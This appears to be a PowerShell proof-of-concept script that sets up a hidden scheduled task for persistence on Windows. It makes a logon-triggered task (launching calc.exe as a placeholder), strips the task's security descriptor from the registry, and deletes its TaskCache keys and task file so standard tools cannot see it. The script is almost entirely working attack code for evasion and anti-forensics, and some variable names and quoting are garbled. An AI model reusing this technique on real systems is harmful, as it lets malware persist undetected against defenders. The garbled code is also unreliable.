#requires -Version 5.0
# Hidden Scheduled Task Persistence Technique
# Note: Requires SYSTEM privileges
# Author: Calvindd2f
# Reference: That malware gang

${t\cache\\tree'} = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\HideItForever'
${\q`\_`\task} = 'schtasks /query /fo LIST /tn HideItForever'
${\c} = '/c'

$create_task = cmd.exe ${\c} 'schtasks /create /tn HideItForever /tr 'C:\Windows\System32\calc.exe" /sc onlogon /ru c"
if( $? ) 
{
  Write-Output -InputObject '	[+] Scheduling HideItForever Task!'
  Write-Output -InputObject '	[+] Querying Task Scheduler ( Can also be verified from the Task Scheduler GUI)'
  $query_task = cmd.exe ${\c} ${\q`\_`\task}
  if( $? ) 
  {
    Write-Output -InputObject '	[+] HideItForever Task is been scheduled successfully!'
    $query_task
    Write-Output -InputObject '	[+] Hiding the HideItForever Task!'
    $hide = Get-Item -Path ${t\cache\\tree'} | Remove-ItemProperty -Name SD
    if ( $? )
    {
      Write-Output -InputObject '	[+] HideItForever Task Hidden!'
      Write-Output -InputObject '	[+] Removing all on-disk Artifacts!'
      $Id_value = Get-ItemPropertyValue -Path ${t\cache\\tree'} -Name 'Id'
      $regfinal = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\' + $Id_value
      Remove-Item -Path ${t\cache\\tree'} -Force
      Remove-Item -Path $regfinal -Force
      Remove-Item -Path "$env:windir\System32\Tasks\HideItForever"  -Force
      Write-Output -InputObject '	[+] The Scheduled Task is now Completely Hidden :) - Go check it out manually!'
      Write-Output -InputObject '	[+] Querying it using Schtasks!'
      cmd.exe ${\c} ${\q`\_`\task}
    }
  }
}
else
{
  Write-Output -InputObject '	[+] Exiting!'
}
